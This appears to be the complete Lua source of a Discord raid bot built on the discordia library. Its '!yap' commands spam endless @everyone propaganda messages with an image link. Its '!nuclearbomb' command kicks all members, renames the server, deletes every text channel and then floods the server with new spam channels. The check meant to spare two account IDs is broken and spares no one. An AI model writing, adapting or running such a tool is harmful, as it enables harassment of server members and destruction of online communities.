local discordia = require("discordia")
local client = discordia.Client()
discordia.extensions.string()
math.randomseed(os.time())

local echomsg = "@everyone\nQUESTO MESSAGGIO E' STATO MANDATO DA VERI PATRIOTTICI DELLA REPUBBLICA FEDERALE POPOLARE DI CAROTA.\nTHIS MESSAGE HAS BEEN SENT BY REAL PATRIOTS FROM THE PEOPLE'S FEDERAL REPUBLIC OF CAROTA.\n"
local imagelink = "https://files.catbox.moe/44w4wc.png"

local raid = false

client:on('ready', function(msg)
	print("ready")
end)

client:on('messageCreate', function(msg)
	local content = msg.content
	local lower = string.lower(content)

	if lower == '!yap' then
		raid = true
		repeat
			msg.channel:send(echomsg.."\n"..imagelink)
		until raid == false
	elseif lower == '!shutup' then
		raid = false
	elseif lower == '!yap noimage' then
		raid = true
		repeat
			msg.channel:send(echomsg)
		until raid == false
	elseif lower == '!nuclearbomb' then
		raid = true
		for i, member in pairs(msg.guild.members:toArray()) do
			-- i just feel so selfish leaving this like this lmao
			if member.user.id ~= 1449521705524396125 or member.user.id ~= 697150884047749121 then
				msg.guild:kickUser(member.user.id)
			end
		end
		msg.channel.guild:setName(msg.channel.guild.name.." // carota")
		for i, channel in pairs(msg.guild.textChannels:toArray()) do
			channel:delete()
		end
		repeat
			msg.channel.guild:createTextChannel("carota"):send(echomsg.."\n"..imagelink)
		until raid == false
	end
end)

client:run("USER_TOKEN")
